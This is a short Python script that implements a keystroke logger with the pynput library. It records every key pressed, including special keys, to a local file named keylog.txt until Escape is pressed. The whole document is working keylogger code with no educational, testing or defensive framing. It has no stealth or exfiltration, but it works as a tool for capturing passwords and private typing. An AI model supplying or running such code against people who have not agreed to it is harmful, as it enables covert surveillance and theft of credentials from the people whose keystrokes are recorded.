from pynput import keyboard

# File to log the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Append the character pressed to the file
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()